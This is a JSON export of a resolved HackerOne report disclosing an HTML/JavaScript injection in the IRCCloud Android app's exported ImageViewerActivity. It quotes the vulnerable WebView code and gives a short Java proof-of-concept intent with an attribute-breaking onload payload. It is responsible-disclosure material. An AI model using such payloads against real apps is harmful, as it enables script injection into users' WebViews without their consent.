{
  "id": 283063,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yODMwNjM=",
  "url": "https://hackerone.com/reports/283063",
  "title": "[IRCCloud Android] XSS in ImageViewerActivity",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "medium",
  "readable_substate": "Resolved",
  "created_at": "2017-10-26T12:18:33.011Z",
  "submitted_at": "2017-10-26T12:18:33.011Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "bagipro",
    "url": "/bagipro",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/052/239/e2ad9e8b8b6b259834c21e7aefd2f3d04ccd3d23_original.jpg/3cb67cc78dc0cba55b102dd9eca2ee89b206d3e960be830f070583d9070b69ef"
    },
    "is_me?": false,
    "cleared": false,
    "verified": true,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 140,
    "url": "https://hackerone.com/irccloud",
    "handle": "irccloud",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/000/140/c90be8ce0ea099d908ca652a82df9952b782e7c2_original.png/235acf2ba808c3a51a94888fb977392c26f8fb0ccf77a81a4546c5e4065c06f1",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/000/140/c90be8ce0ea099d908ca652a82df9952b782e7c2_original.png/3f1ab5c6a9b6dadada1e6c8121700b884388bd0a43471fee1897a38ce57d0b2c"
    },
    "permissions": [],
    "submission_state": "paused",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "pentest_retesting_ends_at": null,
    "profile": {
      "name": "IRCCloud",
      "twitter_handle": "irccloud",
      "website": "https://www.irccloud.com",
      "about": "Group chat for teams, friends, and communities. IRCCloud is an IRC client with a future. Stay connected, chat from anywhere, and never miss a message."
    }
  },
  "has_bounty?": true,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "submitted_with_assistant": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2017-11-03T11:36:13.948Z",
  "bug_reporter_agreed_on_going_public_at": "2017-10-26T17:14:48.752Z",
  "team_member_agreed_on_going_public_at": "2017-11-03T11:36:13.852Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "Hi, I'd like to report HTML/JS injection in activity ```com.irccloud.android.activity.ImageViewerActivity``` which is exported:\n```xml\n        <activity android:configChanges=\"keyboardHidden|orientation|screenSize\" android:label=\"@string/title_activity_imageviewer\" android:name=\"com.irccloud.android.activity.ImageViewerActivity\" android:theme=\"@style/ImageViewerTheme\">\n            <intent-filter>\n                <action android:name=\"android.intent.action.VIEW\"/>\n                <category android:name=\"android.intent.category.DEFAULT\"/>\n                <category android:name=\"android.intent.category.BROWSABLE\"/>\n                <data android:scheme=\"@string/IMAGE_SCHEME\"/>\n            </intent-filter>\n            <intent-filter>\n                <action android:name=\"android.intent.action.VIEW\"/>\n                <category android:name=\"android.intent.category.DEFAULT\"/>\n                <category android:name=\"android.intent.category.BROWSABLE\"/>\n                <data android:scheme=\"@string/IMAGE_SCHEME_SECURE\"/>\n            </intent-filter>\n        </activity>\n```\nso can be launched by arbitrary apps installed on the same device. On the newest Androids could be exploited also by Android Instant Apps directly from a web-browser (installation is not required).\n\nFile ``` com/irccloud/android/activity/ImageViewerActivity.java  ```\n```java\n\n        } else if (getIntent() == null || getIntent().getDataString() == null) {\n            finish();\n        } else {\n            ImageList.getInstance().fetchImageInfo(getIntent().getDataString().replace(getResources().getString(R.string.IMAGE_SCHEME), \"http\"), new OnImageInfoListener() {\n                public void onImageInfo(ImageURLInfo info) {\n                    if (info == null) {\n                        ImageViewerActivity.this.fail();\n                    } else if (info.mp4 != null) {\n                        ImageViewerActivity.this.loadVideo(info.mp4);\n                    } else {\n                        ImageViewerActivity.this.loadImage(info.thumbnail); // by default\n                    }\n                }\n            });\n        }\n```\n\nHere we see that method ```ImageList.fetchImageInfo(..)``` is being loaded with attacker provided data.\nInside ``` ImageList ```:\n```java\n    public void fetchImageInfo(String URL, OnImageInfoListener listener) {\n        // ...\n        String url = URL;\n        // ...\n        ImageURLInfo info = new ImageURLInfo();\n        info.thumbnail = url;\n        info.original_url = URL;\n        putImageInfo(info);\n        listener.onImageInfo(info);\n```\nSo both ```info.thumbnail``` and ```info.original_url``` contains attacker provided data and this stuff is returned back to ```ImageViewerActivity``` where code is executed\n```java\nImageViewerActivity.this.loadImage(info.thumbnail);\n```\n\nInside this method attacker can inject arbitrary HTML/JS:\n```java\nprivate void loadImage(String urlStr) {\n        try {\n            // ...\n            this.mImage.loadDataWithBaseURL(null, \"<!DOCTYPE html>\\n<html><head><style>html, body, table { height: 100%; width: 100%; background-color: #000;}</style></head>\\n<body>\\n<table><tr><td><img src='\" + new URL(urlStr).toString() + \"' width='100%' onerror='Android.imageFailed()' onclick='Android.imageClicked()' style='background-color: #fff;'/>\\n</td></tr></table></body>\\n</html>\", \"text/html\", \"UTF-8\", null);\n```\n\nPoC of exploitation on Java:\n```java\n        Intent intent = new Intent();\n        intent.setClassName(\"com.irccloud.android\", \"com.irccloud.android.activity.ImageViewerActivity\");\n        intent.setData(Uri.parse(\"https://shoppersocial.me/wp-content/uploads/2016/06/wow.jpg' onload='window.location.href=\\\"http://yahoo.com\\\"\"));\n        startActivity(intent);\n```\n\nResult:\n{F233010}\n{F233011}\n\nAPK is attached",
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [
    {
      "id": 233010,
      "file_name": "2017-10-26_15-15-58.jpg",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/233/010/6f259ee38d609477cfc958a9dbd9b2ddbe712b32/2017-10-26_15-15-58.jpg?response-content-disposition=attachment%3B%20filename%3D%222017-10-26_15-15-58.jpg%22%3B%20filename%2A%3DUTF-8%27%272017-10-26_15-15-58.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWNAVQAE5%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T194559Z&X-Amz-Expires=625&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIDXG8q7VRdTP631MKmZ4fvttzAAv5lCyYMYNV784kGZjAiEAhv%2BV9Mg5xs9Q4zCmYFH6om2UWIbqTxOXrpZ%2B2%2FbDzXUqsgUIFxADGgwwMTM2MTkyNzQ4NDkiDIGZ8kKbAh%2F%2FPWaDsiqPBYhP8pm4XnRFxjp804kA9dz%2FChkMoeCRo09H5RRxUKWuL3Hht7UB8pviq0Ph1K%2FHTcmGwh93q4Ayukv4kY%2BcdKeSYjRmw7cMDjaogAMTIMitBxFdtPgjmRnaKyJaPF0A%2F6UzCpRMz8FumQa21icnzynw9cJSd6wSMqfRakvCMB%2Be5Z%2BkIjhcACm5f3POul28BVznGYgXSXTovo3lOSWBFyZX17ClfGQEYehe8I7VG8F35pVjCkxwqEzP144HMVnkdtpsIyAVOG7WPcwm0KOJIx%2BKhAfImQT8dkW2AAtqfv4kvgvcZEnUS2Kp5DyxNy7WA5M3rPHLk8%2FzfcC%2Fnukmx2PtTkeoP2CAS9%2F0pP2jZb1sFPGq8QGv8dP55JjbbblQxg9HaySXhO4AXDI4tFgfvmEtNBuLfgEN%2FEv66OQjA1SyZR0XnbI4MlhOXGkCl51AQKDXhKM593ZzKaqxWdkRWKbQOUM4Ha%2FX2mtuuAp4%2BfbSGJfHy82Wd80nfR4NnZMYIVEJbDh%2FOIK0VuA9qGn60PMdaDoYFrvfD3WDulA7eKHmb1IhiKFTRB3j7%2FgAuvWEb0NbOL2jpPScBL3zDV8xE%2Fvpkmj43tE4Fh1oTcU6fcE6gsUrEtO9Mo%2F1WYnTC%2Bnk60PuuAWuwhxBmcLoLPHCgBoxbByWS%2ByB9HY4ykbUqFeZugpyHXiCRsojTioWXw5L7M9o8vSnDryl%2FD3%2BDaZp2c0LCWnQy6%2B4DRQGXou85vQgzUF6aJDkiZyH9H%2FxDiew0JWB8vX9aEAwOZlcRETdgrACRgiiHY%2Bfaljot3%2Fmdn7CReK7PfRAN82qHWcr9U6NyHZzgmsTiQgkwHX07UrlU%2BzftbSlgIhPu%2F%2BYSFfdWNIwjPu%2FxgY6sQFxUOygixf0qUsgG%2FoVgsW28C5CvqIZyDpjPSKJhur1%2BBEZTfeh7FuHjp6tNQHenSwpHhoXwkfsxw4BvOxv%2B3ofBVdTjcQRLA4pXbur3BVLK%2FVGkeDfwJqLBZAGws1RhaqQPVp1EFpm0n3qwn3SoKfRKGCIXopjlcwH0Ard%2FdpHuLMYOvSLKY5oBhl%2FK35lY2n6pQMWBiSvhUOEy6JlIg5pzKInsUfJ3kz84TanaiOhAKg%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=de6a36be52d04a9b7ceaba7cbf7e6b9436e97a97d1a39e25fc88693ac28621ea",
      "file_size": 34486,
      "type": "image/jpeg",
      "moderated": null
    },
    {
      "id": 233011,
      "file_name": "2017-10-26_15-15-26.jpg",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/233/011/146432005717c4cb5a03428bd861945404c89327/2017-10-26_15-15-26.jpg?response-content-disposition=attachment%3B%20filename%3D%222017-10-26_15-15-26.jpg%22%3B%20filename%2A%3DUTF-8%27%272017-10-26_15-15-26.jpg&response-content-type=image%2Fjpeg&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWNAVQAE5%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T194559Z&X-Amz-Expires=625&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIDXG8q7VRdTP631MKmZ4fvttzAAv5lCyYMYNV784kGZjAiEAhv%2BV9Mg5xs9Q4zCmYFH6om2UWIbqTxOXrpZ%2B2%2FbDzXUqsgUIFxADGgwwMTM2MTkyNzQ4NDkiDIGZ8kKbAh%2F%2FPWaDsiqPBYhP8pm4XnRFxjp804kA9dz%2FChkMoeCRo09H5RRxUKWuL3Hht7UB8pviq0Ph1K%2FHTcmGwh93q4Ayukv4kY%2BcdKeSYjRmw7cMDjaogAMTIMitBxFdtPgjmRnaKyJaPF0A%2F6UzCpRMz8FumQa21icnzynw9cJSd6wSMqfRakvCMB%2Be5Z%2BkIjhcACm5f3POul28BVznGYgXSXTovo3lOSWBFyZX17ClfGQEYehe8I7VG8F35pVjCkxwqEzP144HMVnkdtpsIyAVOG7WPcwm0KOJIx%2BKhAfImQT8dkW2AAtqfv4kvgvcZEnUS2Kp5DyxNy7WA5M3rPHLk8%2FzfcC%2Fnukmx2PtTkeoP2CAS9%2F0pP2jZb1sFPGq8QGv8dP55JjbbblQxg9HaySXhO4AXDI4tFgfvmEtNBuLfgEN%2FEv66OQjA1SyZR0XnbI4MlhOXGkCl51AQKDXhKM593ZzKaqxWdkRWKbQOUM4Ha%2FX2mtuuAp4%2BfbSGJfHy82Wd80nfR4NnZMYIVEJbDh%2FOIK0VuA9qGn60PMdaDoYFrvfD3WDulA7eKHmb1IhiKFTRB3j7%2FgAuvWEb0NbOL2jpPScBL3zDV8xE%2Fvpkmj43tE4Fh1oTcU6fcE6gsUrEtO9Mo%2F1WYnTC%2Bnk60PuuAWuwhxBmcLoLPHCgBoxbByWS%2ByB9HY4ykbUqFeZugpyHXiCRsojTioWXw5L7M9o8vSnDryl%2FD3%2BDaZp2c0LCWnQy6%2B4DRQGXou85vQgzUF6aJDkiZyH9H%2FxDiew0JWB8vX9aEAwOZlcRETdgrACRgiiHY%2Bfaljot3%2Fmdn7CReK7PfRAN82qHWcr9U6NyHZzgmsTiQgkwHX07UrlU%2BzftbSlgIhPu%2F%2BYSFfdWNIwjPu%2FxgY6sQFxUOygixf0qUsgG%2FoVgsW28C5CvqIZyDpjPSKJhur1%2BBEZTfeh7FuHjp6tNQHenSwpHhoXwkfsxw4BvOxv%2B3ofBVdTjcQRLA4pXbur3BVLK%2FVGkeDfwJqLBZAGws1RhaqQPVp1EFpm0n3qwn3SoKfRKGCIXopjlcwH0Ard%2FdpHuLMYOvSLKY5oBhl%2FK35lY2n6pQMWBiSvhUOEy6JlIg5pzKInsUfJ3kz84TanaiOhAKg%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=2001293a108d3644a191b47893d0fe422436f106d4ebb65c791d74d1997372f0",
      "file_size": 223467,
      "type": "image/jpeg",
      "moderated": null
    },
    {
      "id": 233012,
      "file_name": "app-release.apk",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/233/012/13b98903aec19680eb7ea94d784dcc3c4b7859cb/app-release.apk?response-content-disposition=attachment%3B%20filename%3D%22app-release.apk%22%3B%20filename%2A%3DUTF-8%27%27app-release.apk&response-content-type=application%2Fzip&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWNAVQAE5%2F20250921%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250921T194559Z&X-Amz-Expires=625&X-Amz-Security-Token=IQoJb3JpZ2luX2VjEI7%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIDXG8q7VRdTP631MKmZ4fvttzAAv5lCyYMYNV784kGZjAiEAhv%2BV9Mg5xs9Q4zCmYFH6om2UWIbqTxOXrpZ%2B2%2FbDzXUqsgUIFxADGgwwMTM2MTkyNzQ4NDkiDIGZ8kKbAh%2F%2FPWaDsiqPBYhP8pm4XnRFxjp804kA9dz%2FChkMoeCRo09H5RRxUKWuL3Hht7UB8pviq0Ph1K%2FHTcmGwh93q4Ayukv4kY%2BcdKeSYjRmw7cMDjaogAMTIMitBxFdtPgjmRnaKyJaPF0A%2F6UzCpRMz8FumQa21icnzynw9cJSd6wSMqfRakvCMB%2Be5Z%2BkIjhcACm5f3POul28BVznGYgXSXTovo3lOSWBFyZX17ClfGQEYehe8I7VG8F35pVjCkxwqEzP144HMVnkdtpsIyAVOG7WPcwm0KOJIx%2BKhAfImQT8dkW2AAtqfv4kvgvcZEnUS2Kp5DyxNy7WA5M3rPHLk8%2FzfcC%2Fnukmx2PtTkeoP2CAS9%2F0pP2jZb1sFPGq8QGv8dP55JjbbblQxg9HaySXhO4AXDI4tFgfvmEtNBuLfgEN%2FEv66OQjA1SyZR0XnbI4MlhOXGkCl51AQKDXhKM593ZzKaqxWdkRWKbQOUM4Ha%2FX2mtuuAp4%2BfbSGJfHy82Wd80nfR4NnZMYIVEJbDh%2FOIK0VuA9qGn60PMdaDoYFrvfD3WDulA7eKHmb1IhiKFTRB3j7%2FgAuvWEb0NbOL2jpPScBL3zDV8xE%2Fvpkmj43tE4Fh1oTcU6fcE6gsUrEtO9Mo%2F1WYnTC%2Bnk60PuuAWuwhxBmcLoLPHCgBoxbByWS%2ByB9HY4ykbUqFeZugpyHXiCRsojTioWXw5L7M9o8vSnDryl%2FD3%2BDaZp2c0LCWnQy6%2B4DRQGXou85vQgzUF6aJDkiZyH9H%2FxDiew0JWB8vX9aEAwOZlcRETdgrACRgiiHY%2Bfaljot3%2Fmdn7CReK7PfRAN82qHWcr9U6NyHZzgmsTiQgkwHX07UrlU%2BzftbSlgIhPu%2F%2BYSFfdWNIwjPu%2FxgY6sQFxUOygixf0qUsgG%2FoVgsW28C5CvqIZyDpjPSKJhur1%2BBEZTfeh7FuHjp6tNQHenSwpHhoXwkfsxw4BvOxv%2B3ofBVdTjcQRLA4pXbur3BVLK%2FVGkeDfwJqLBZAGws1RhaqQPVp1EFpm0n3qwn3SoKfRKGCIXopjlcwH0Ard%2FdpHuLMYOvSLKY5oBhl%2FK35lY2n6pQMWBiSvhUOEy6JlIg5pzKInsUfJ3kz84TanaiOhAKg%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=07a9b09d4f2ffcfe2b1f2557f797c6c6dc490ab8a0d03d2e8f3d14861f319267",
      "file_size": 4668900,
      "type": "application/zip",
      "moderated": null
    }
  ],
  "allow_singular_disclosure_at": "2017-11-25T17:14:48.792Z",
  "allow_singular_disclosure_after": -246853870.82934338,
  "singular_disclosure_allowed": true,
  "vote_count": 43,
  "voters": [
    "rmrizki",
    "sheikhrishad0",
    "cswiers",
    "michael1026",
    "alesandroortiz",
    "yogesh_ojha",
    "eveeez",
    "nileninja",
    "msalihb",
    "t4ym",
    "and 33 more..."
  ],
  "severity": {
    "rating": "medium",
    "author_type": "User"
  },
  "structured_scope": {
    "databaseId": 271,
    "asset_type": "GOOGLE_PLAY_APP_ID",
    "asset_identifier": "com.irccloud.android",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
